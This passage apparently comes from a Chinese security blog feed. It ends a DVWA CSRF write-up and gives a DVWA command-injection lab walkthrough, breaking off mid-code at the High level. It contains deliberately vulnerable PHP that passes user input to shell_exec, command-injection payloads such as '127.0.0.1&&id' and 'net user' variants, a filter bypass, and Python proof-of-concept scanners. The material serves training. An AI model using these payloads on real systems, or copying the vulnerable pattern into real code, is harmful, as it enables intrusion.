variable">$pass_new</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass_new</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Update database with new password</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string">'UPDATE users SET password = (:password) WHERE user = (:user);'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string">':password'</span><span class="token punctuation">,</span> <span class="token variable">$pass_new</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string">':user'</span><span class="token punctuation">,</span> <span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Feedback for the user</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>Password Changed.&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Issue with passwords matching</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>Passwords did not match or current password incorrect.&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// Generate Anti-CSRF token</span><span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> </code></pre><ul><li>添加原密码验证功能，同时使用PDO创建动态SQL语句。</li></ul><h1 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h1><ul><li>对于修改数据和登陆表单提交使用 POST 方式，同时数据通过 POST 方式读取</li><li>添加随机 token 预防 csrf 攻击</li><li>对提交的请求进行 referer 验证，验证规则请求 referer 必须以 http(s)://host:port/开头</li><li>针对修改密码，需要输入原密码进行验证</li><li>可添加验证码进行用户确认  </li></ul><h1 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h1><ul><li>《DVWA 漏洞测试平台分析》，红日安全工具研发组长-Silence</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
            <tag> SCRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA-CommandInjection</title>
      <link href="/2020/09/12/dvwa-commandinjection/"/>
      <url>/2020/09/12/dvwa-commandinjection/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>​        命令注入是指在易受攻击的应用程序中注入和执行攻击者指定的命令(系统命令、)，执行的命令具有与web 服务相同的权限和环境。  </p><p><strong>Commmand Injection模块分析</strong></p><ul><li><code>Command Injection</code>模块实现的是网络管理系统中的<code>ping</code>命令测试功能，可以检测指定IP地址主机的存活。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CommandInjection/仿网络管理ping功能.png" alt="仿网络管理ping功能"></center><ul><li>输入正常IP地址进行测试</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CommandInjection/NormalIP-result.png" alt="NormalIP-result"></center><ul><li>输入正常域名进行测试</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CommandInjection/NormalDomain-result.png" alt="NormalDomain-result"></center><ul><li>输入非法字符进行测试</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CommandInjection/illegalChar-result.png" alt="illegalChar-result"></center><h1 id="0x02-测试工具"><a href="#0x02-测试工具" class="headerlink" title="0x02 测试工具"></a>0x02 测试工具</h1><ul><li>FireFox</li></ul><h1 id="0x03-漏洞测试"><a href="#0x03-漏洞测试" class="headerlink" title="0x03 漏洞测试"></a>0x03 漏洞测试</h1><h2 id="Low级别"><a href="#Low级别" class="headerlink" title="Low级别"></a>Low级别</h2><p>​        设置 DVWA 安全级别为 LOW 。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Low.png" alt="SecurityLevel_Low"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string">'Submit'</span> <span class="token punctuation">]</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Get input</span>    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string">'ip'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Determine OS and execute the ping command.</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stristr</span><span class="token punctuation">(</span> <span class="token function">php_uname</span><span class="token punctuation">(</span> <span class="token string">'s'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'Windows NT'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Windows</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string">'ping  '</span> <span class="token punctuation">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// *nix</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string">'ping  -c 4 '</span> <span class="token punctuation">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Feedback for the end user</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;pre>{$cmd}&lt;/pre>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><p>​        前端代码没有做任何注入防护。</p><p><strong>漏洞利用</strong>：</p><p><strong>方法一：文本框注入测试</strong></p><ul><li><p>使用FireFox浏览器访问DVWA站点，登录成功后选择<code>Command Injection</code>模块，在文本框中分别提交以下数据：</p><ul><li><code>127.0.0.1&amp;&amp;id</code></li><li><code>127.0.0.1&amp;&amp;net user</code></li><li><code>testcmdinjection||id</code></li><li><code>testcmdinjection||net user</code></li><li><code>127.0.0.1&amp;id</code></li><li><code>127.0.0.1&amp;net user</code></li><li><code>testcmdinjection|id</code></li><li><code>testcmdinjection|net user</code></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CommandInjection/IP+id-result.png" alt="IP+id-result"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CommandInjection/IP+netuser-result.png" alt="IP+netuser-result"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CommandInjection/testcmd-id-result.png" alt="testcmd-id-result"></center></li><li><p>命令注入漏洞的判断主要是在提交包含注入命令数据后根据回显结果是否包含执行命令记过特征进行判断。</p></li></ul><p><strong>方法二：自编写POC</strong></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Version: python3</span><span class="token comment" spellcheck="true"># Author: Silence</span><span class="token comment" spellcheck="true"># Encoding: utf-8</span><span class="token keyword">import</span> re<span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">injection</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>headers<span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">'http://{0}:{1}/dvwa/vulnerabilities/exec/'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token operator">*</span>addr<span class="token punctuation">)</span>    name <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>    pattern <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token string">'pattern'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> pld <span class="token keyword">in</span> payload<span class="token punctuation">[</span><span class="token string">'payloads'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        params <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'ip'</span> <span class="token punctuation">:</span> pld<span class="token punctuation">,</span>            <span class="token string">'Submit'</span> <span class="token punctuation">:</span> <span class="token string">'Submit'</span>        <span class="token punctuation">}</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>ok <span class="token operator">and</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'+ name:'</span><span class="token punctuation">,</span>name<span class="token punctuation">,</span> <span class="token string">',payload:'</span><span class="token punctuation">,</span>pld<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>headers<span class="token punctuation">)</span><span class="token punctuation">:</span>    payloads <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token punctuation">{</span>                <span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'id'</span><span class="token punctuation">,</span>                <span class="token string">'pattern'</span><span class="token punctuation">:</span>r<span class="token string">'uid=\d'</span><span class="token punctuation">,</span>                <span class="token string">'payloads'</span><span class="token punctuation">:</span><span class="token punctuation">[</span>                <span class="token string">'127.0.0.1;id;'</span><span class="token punctuation">,</span>                <span class="token string">'127.0.0.1&amp;&amp;id'</span><span class="token punctuation">,</span>                <span class="token string">'127.0.0.1&amp;id'</span><span class="token punctuation">,</span>                <span class="token string">'127.0.0.1|id'</span><span class="token punctuation">,</span>                <span class="token string">'127.0.0.1||id'</span><span class="token punctuation">,</span>                <span class="token string">'testcmdinjection&amp;id'</span><span class="token punctuation">,</span>                <span class="token string">'testcmdinjection|id'</span><span class="token punctuation">,</span>                <span class="token string">'testcmdinjection||id'</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span>            <span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'net user'</span><span class="token punctuation">,</span>            <span class="token string">'pattern'</span><span class="token punctuation">:</span>r<span class="token string">'Administrator'</span><span class="token punctuation">,</span>            <span class="token string">'payloads'</span><span class="token punctuation">:</span><span class="token punctuation">[</span>                <span class="token string">'127.0.0.1&amp;&amp;net user'</span><span class="token punctuation">,</span>                <span class="token string">'127.0.0.1&amp;net user'</span><span class="token punctuation">,</span>                <span class="token string">'127.0.0.1|net user'</span><span class="token punctuation">,</span>                <span class="token string">'testcmdinjection&amp;net user'</span><span class="token punctuation">,</span>                <span class="token string">'testcmdinjection|net user'</span><span class="token punctuation">,</span>                <span class="token string">'testcmdinjection||net user'</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>    <span class="token keyword">for</span> payload <span class="token keyword">in</span> payloads<span class="token punctuation">:</span>        injection<span class="token punctuation">(</span>addr<span class="token punctuation">,</span>headers<span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    server <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'124.70.137.227'</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token punctuation">)</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'Cookie'</span> <span class="token punctuation">:</span> <span class="token string">'security=low; PHPSESSID=gqhrhpesfenrmv2veseur4orb6'</span>    <span class="token punctuation">}</span>    main<span class="token punctuation">(</span>server<span class="token punctuation">,</span>headers<span class="token punctuation">)</span></code></pre><p>使用：</p><ul><li>从浏览器中 <code>copy</code>登陆成功后的 <code>cookie</code>信息</li><li>使用 <code>python3</code>运行脚本</li></ul><p>说明：</p><ul><li>使用 <code>requests</code>发送请求到 <code>dvwa</code>， 在提交时使用具有注入命令的参数，通过注入命<br>令执行结果特征码进行识别是否具有漏洞  </li></ul><p>执行结果：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CommandInjection/POC-low-result.png" alt="POC-low-result"></center><h2 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h2><p>​        设置 DVWA 安全级别为 Medium。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Medium.png" alt="SecurityLevel_Medium"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string">'Submit'</span> <span class="token punctuation">]</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Get input</span>    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string">'ip'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Set blacklist</span>    <span class="token variable">$substitutions</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string">'&amp;&amp;'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>        <span class="token string">';'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Remove any of the charactars in the array (blacklist).</span>    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token function">array_keys</span><span class="token punctuation">(</span> <span class="token variable">$substitutions</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$substitutions</span><span class="token punctuation">,</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Determine OS and execute the ping command.</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stristr</span><span class="token punctuation">(</span> <span class="token function">php_uname</span><span class="token punctuation">(</span> <span class="token string">'s'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'Windows NT'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Windows</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string">'ping  '</span> <span class="token punctuation">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// *nix</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string">'ping  -c 4 '</span> <span class="token punctuation">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Feedback for the end user</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;pre>{$cmd}&lt;/pre>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><ul><li>代码会对输入的<code>&amp;&amp;</code>和<code>;</code>进行过滤，可以使用<code>&amp;;&amp;</code>来绕过</li></ul><p><strong>漏洞利用：</strong></p><p><strong>方式一：文本框注入测试</strong></p><ul><li><p>使用FireFox浏览器访问DVWA站点，登录成功后选择<code>Command Injection</code>模块，在文本框中分别提交以下数据：</p><ul><li><code>127.0.0.1&amp;;&amp;id</code></li><li><code>127.0.0.1&amp;;&amp;net user</code></li><li><code>testcmdinjection||id</code></li><li><code>testcmdinjection||net user</code></li><li><code>127.0.0.1&amp;id</code></li><li><code>127.0.0.1&amp;net user</code></li><li><code>testcmdinjection|id</code></li><li><code>testcmdinjection|net user</code></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CommandInjection/IP+netuser-Medium-result.png" alt="IP+netuser-Medium-result"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/CommandInjection/testcmd-netuser-Medium-result.png" alt="testcmd-netuser-Medium-result"></center></li><li><p>命令注入漏洞的判断主要是在提交包含注入命令数据后根据回显结果是否包含执行命令记过特征进行判断。</p></li></ul><p><strong>方式二：自编写POC</strong></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Version: python3</span><span class="token comment" spellcheck="true"># Author: Silence</span><span class="token comment" spellcheck="true"># Encoding: utf-8</span><span class="token keyword">import</span> re<span class="token keyword">from</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>thread <span class="token keyword">import</span> ThreadPoolExecutor<span class="token keyword">import</span> itertools<span class="token keyword">import</span> requestsWORKERS <span class="token operator">=</span> <span class="token number">10</span><span class="token keyword">def</span> <span class="token function">injection</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    addr<span class="token punctuation">,</span>headers<span class="token punctuation">,</span>payload <span class="token operator">=</span> data    url <span class="token operator">=</span> <span class="token string">'http://{0}:{1}/dvwa/vulnerabilities/exec/'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token operator">*</span>addr<span class="token punctuation">)</span>    name <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>    pattern <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token string">'pattern'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> pld <span class="token keyword">in</span> payload<span class="token punctuation">[</span><span class="token string">'payloads'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        params <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'ip'</span> <span class="token punctuation">:</span> pld<span class="token punctuation">,</span>            <span class="token string">'Submit'</span> <span class="token punctuation">:</span> <span class="token string">'Submit'</span>        <span class="token punctuation">}</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>ok <span class="token operator">and</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token punctuation">,</span>name<span class="token punctuation">,</span>pld    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span>name<span class="token punctuation">,</span>None<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>headers<span class="token punctuation">)</span><span class="token punctuation">:</span>    payloads <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token punctuation">{</span>                <span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'id'</span><span class="token punctuation">,</span>                <span class="token string">'pattern'</span><span class="token punctuation">:</span>r<span class="token string">'uid=\d'</span><span class="token punctuation">,</span>                <span class="token string">'payloads'</span><span class="token punctuation">:</span><span class="token punctuation">[</span>                <span class="token string">'127.0.0.1;id;'</span><span class="token punctuation">,</span>                <span class="token string">'127.0.0.1&amp;;&amp;id'</span><span class="token punctuation">,</span>                <span class="token string">'127.0.0.1&amp;id'</span><span class="token punctuation">,</span>                <span class="token string">'127.0.0.1|id'</span><span class="token punctuation">,</span>                <span class="token string">'127.0.0.1||id'</span><span class="token punctuation">,</span>                <span class="token string">'testcmdinjection&amp;id'</span><span class="token punctuation">,</span>                <span class="token string">'testcmdinjection|id'</span><span class="token punctuation">,</span>                <span class="token string">'testcmdinjection||id'</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span>            <span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'net user'</span><span class="token punctuation">,</span>            <span class="token string">'pattern'</span><span class="token punctuation">:</span>r<span class="token string">'Administrator'</span><span class="token punctuation">,</span>            <span class="token string">'payloads'</span><span class="token punctuation">:</span><span class="token punctuation">[</span>                <span class="token string">'127.0.0.1&amp;;&amp;net user'</span><span class="token punctuation">,</span>                <span class="token string">'127.0.0.1&amp;net user'</span><span class="token punctuation">,</span>                <span class="token string">'127.0.0.1|net user'</span><span class="token punctuation">,</span>                <span class="token string">'testcmdinjection&amp;net user'</span><span class="token punctuation">,</span>                <span class="token string">'testcmdinjection|net user'</span><span class="token punctuation">,</span>                <span class="token string">'testcmdinjection||net user'</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>    datas <span class="token operator">=</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span><span class="token punctuation">[</span>addr<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>headers<span class="token punctuation">]</span><span class="token punctuation">,</span>payloads<span class="token punctuation">)</span>    executor <span class="token operator">=</span> ThreadPoolExecutor<span class="token punctuation">(</span>max_workers<span class="token operator">=</span>WORKERS<span class="token punctuation">)</span>    <span class="token keyword">for</span> success<span class="token punctuation">,</span>name<span class="token punctuation">,</span>payload <span class="token keyword">in</span> executor<span class="token punctuation">.</span>map<span class="token punctuation">(</span>injection<span class="token punctuation">,</span>datas<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> success<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'+ name:'</span><span class="token punctuation">,</span>name<span class="token punctuation">,</span><span class="token string">',payload:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    server <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'124.70.137.227'</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token punctuation">)</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'Cookie'</span> <span class="token punctuation">:</span> <span class="token string">'security=medium; PHPSESSID=gqhrhpesfenrmv2veseur4orb6'</span>    <span class="token punctuation">}</span>    main<span class="token punctuation">(</span>server<span class="token punctuation">,</span>headers<span class="token punctuation">)</span></code></pre><p>使用：</p><ul><li>从浏览器中 copy 登陆成功后的 cookie 信息</li><li>使用 python3 运行脚本</li></ul><p>说明：</p><ul><li>使用线程池机制同时发起多个请求</li><li>使用 requests 发送请求到 dvwa，在提交时使用具有注入命令的参数，通过注入命令执行结果特征码进行识别是否具有漏洞  </li></ul><h2 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h2><p>​    设置 DVWA 安全级别为 High。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_High.png" alt="SecurityLevel_High"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string">'Submit'</span> <span class="token punctuation">]</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Get input</span>    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string">'ip'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Set blacklist</span>    <span class="token variable">$substitutions</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string">'&amp;'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>        <span class="token string">';'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>        <span class="token string">'| '</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>        <span class="token string">'-'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>        <span class="token string">'$'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>        <span class="token string">'('</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>        <span class="token string">')'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>        <span class="token string">'`'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>        <span class="token string">'||'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Remove any of the charactars in the array (blacklist).</span>    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token function">array_keys</span><span class="token punctuation">(</span> <span class="token variable">$substitutions</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$substitutions</span><span class="token punctuation">,</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Determine OS and execute the ping command.</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stristr</span><span class="token punctuation">(</span> <span class="token function">php_uname</span><span class="token punctuation">(</span> <span class="token string">'s'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'Windows NT'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Windows</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string">'ping  '</span> <span class="token punctuation">.</span> <span 